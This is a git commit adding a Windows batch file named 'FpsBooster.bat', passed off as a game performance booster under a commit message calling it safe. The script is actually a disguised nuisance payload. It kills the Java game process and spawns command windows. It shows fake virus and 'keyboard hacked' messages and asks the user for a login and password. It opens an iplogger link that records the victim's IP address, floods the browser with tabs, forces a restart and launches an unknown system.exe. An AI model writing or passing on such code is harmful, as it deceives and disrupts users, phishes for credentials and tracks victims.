f8aec83df6ea27e8652ab1b2af8d76f6dd43e81b
ForgedSengoku <70347130+Artem-xe@users.noreply.github.com>
2023-02-17 23:23:07 +0100

    This file is safe check your self on virustotal

---
+++ FpsBooster.bat
@@ -0,0 +1,180 @@
+taskkill javaw.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+msg *DOWNLOAD ME*
+@echo off
+:x
+start https://www.google.com/search?q=How+to+enable+triggerbot+on+fortnite&safe=active&sxsrf=AJOqlzXaeriDs33oIM1wSYzEAN4Ki1wM2A%3A1676652011264&ei=663vY8zlD42OrwTwhYLYCQ&ved=0ahUKEwiMh6y8_5z9AhUNx4sKHfCCAJsQ4dUDCA8&uact=5&oq=How+to+enable+triggerbot+on+fortnite&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIHCCEQoAEQCjoKCAAQRxDWBBCwAzoECCMQJzoECC4QQzoFCAAQgAQ6CwguEIAEEMcBEK8BOgUILhCABDoECAAQQzoICC4QgAQQ1AI6CAgAEIAEEMsBOggILhCABBDLAToLCC4QgAQQ1AIQywE6BwgjEOoCECc6BggAEBYQHjoJCAAQFhAeEPEEOgkIABAeEA0Q8QQ6BggAEB4QDToJCAAQDRCABBATOggIABAeEA0QEzoLCAAQHhANEPEEEBM6BQghEKABOgQIIRAVOgoIIRAWEB4QHRAKSgQIQRgAUMJqWImjAWCI0QFoEHABeACAAZQBiAGAJJIBBTIyLjIzmAEAoAEBsAEKyAEIwAEB&sclient=gws-wiz-serp
+@echo off
+:x
+start https://www.google.com/search?q=How+to+get+girl&safe=active&sxsrf=AJOqlzUitMTFmxmQBdZ_5Klssei5vsBnrA%3A1676652040104&ei=CK7vY-L6BbLMrgS43Z6oAg&ved=0ahUKEwjinozK_5z9AhUyposKHbiuByUQ4dUDCA8&uact=5&oq=How+to+get+girl&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywE6CggAEEcQ1gQQsAM6BAgjECc6BAguEEM6BQgAEIAEOgsILhCABBDHARCvAToFCC4QgAQ6CAguEIAEENQCOggILhCABBDLAToLCC4QgAQQ1AIQywE6BggjECcQE0oECEEYAFCrCFj5IWDSI2gDcAF4AYAB2wGIAdsLkgEGMTIuMi4xmAEAoAEByAEIwAEB&sclient=gws-wiz-serp
+@echo off
+:x
+start https://www.google.com/search?q=WOW+YOU+OPEN+THE+FILE+COMPUTERFIX.BAT+NOW+YOU+HAVE+A+VIRUS.&safe=active&sxsrf=AJOqlzUitMTFmxmQBdZ_5Klssei5vsBnrA%3A1676652040104&ei=CK7vY-L6BbLMrgS43Z6oAg&ved=0ahUKEwjinozK_5z9AhUyposKHbiuByUQ4dUDCA8&uact=5&oq=WOW+YOU+OPEN+THE+FILE+COMPUTERFIX.BAT+NOW+YOU+HAVE+A+VIRUS.&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzoKCAAQRxDWBBCwAzoECCMQJzoECAAQQzoFCC4QgAQ6BAguEEM6CwguEIAEEMcBENEDOgUIABCABDoICC4QgAQQ1AI6BwguENQCEEM6BwgAEIAEEAo6CAguEIAEEMsBOggIABCABBDLAToLCAAQFhAeEA8Q8QQ6BggAEBYQHjoJCAAQFhAeEPEEOggIABAWEB4QCjoLCAAQFhAeEPEEEAo6CwgAEAgQHhANEPEEOggIABAIEB4QDToICAAQFhAeEA86DQgAEAgQHhANEA8Q8QQ6BQghEKABOgsIIRAWEB4Q8QQQHToICCEQFhAeEB06CgghEBYQHhAPEB06BwghEKABEAo6BAghEBVKBAhBGABQlwpY72JggWRoC3ABeACAAbQBiAGkO5IBBDguNTaYAQCgAQHIAQjAAQE&sclient=gws-wiz-serp
+@echo off
+:x 
+start https://smoke.pl/
+@echo off
+:x 
+start https://iplogger.com/2LRMF5
+@echo off
+:x 
+start https://www.google.com/search?q=You+download+wrong+virus+file&oq=You+download+wrong+virus+file+&aqs=chrome..69i57j69i64.7219j0j7&sourceid=chrome&ie=UTF-8&safe=active
+msg *Subribe to forgedsengoku to fix the virus!!!1!1!!!1!*
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q@echo
+:x 
+start https://www.youtube.com/channel/UCSof2exOA0T2dMIO1iJj61Q
+@echo off 
+:x 
+start https://www.google.com/search?q=MOTHER+DOWNLOAD+A+WRONG+FILE+BY+ARTEM+SKRAGA&safe=active&sxsrf=AJOqlzVYR_E0IsJnASGcfUKn8ToX7mFFpA%3A1676652278643&ei=9q7vY-HwJtaErgSimq3QDg&ved=0ahUKEwjhw-u7gJ39AhVWgosKHSJNC-oQ4dUDCA8&uact=5&oq=MOTHER+DOWNLOAD+A+WRONG+FILE+BY+ARTEM+SKRAGA&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIFCCEQoAEyBQghEKABMgUIIRCgATIFCCEQoAE6CggAEEcQ1gQQsAM6BAgjECc6BQgAEIAEOgsILhCABBDHARCvAToECAAQQzoLCC4QgAQQxwEQ0QM6BAguEEM6BQguEIAEOggILhCABBDLAToICAAQgAQQywE6CwguEIAEENQCEMsBOgkIABAWEB4Q8QQ6BggAEBYQHjoECCEQFToLCCEQFhAeEPEEEB06CAghEBYQHhAdOgoIIRAWEB4QDxAdOg0IIRAWEB4QDxDxBBAdOgcIIRCgARAKSgQIQRgAUMMHWNs6YOw7aAdwAXgCgAGxBIgBjTCSAQo5LjM3LjIuNS0xmAEAoAEByAECwAEB&sclient=gws-wiz-serp
+@echo off
+:x 
+start https://www.google.com/search?q=How+to+delete+system+32+from+pc&oq=How+to+delete+system+32+from+pc&aqs=chrome..69i57j0i22i30i625j0i15i22i30.7195j0j9&sourceid=chrome&ie=UTF-8&safe=active
+@echo off
+:x 
+start https://minecraft-inside.ru/download/255071/
+msg *): LOL MINER*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *Keyboard was hacked by HACKERS TEAM*
+msg *give me your Login and password go to site https://www.passwordmonster.com*
+@echo off
+:x 
+start https://www.passwordmonster.com/
+shutdown /r
+@echo off
+:x 
+start https://www.updatestar.com/pl/topic/mrs%20major%203.0%20download
+msg *Also updates on this bat file*
+@echo off
+:x 
+start https://sciencetrek.org/sciencetrek/topics/garbage/links.cfm
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=PqIMNE7QBSQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+:x 
+start https://www.youtube.com/watch?v=TV2BtCpSqwQ
+@echo off
+x:
+start https://www.youtube.com/watch?v=upnit5ptDtk
+start cmd.exe 
+start cmd.exe 
+start cmd.exe
+start system.exe
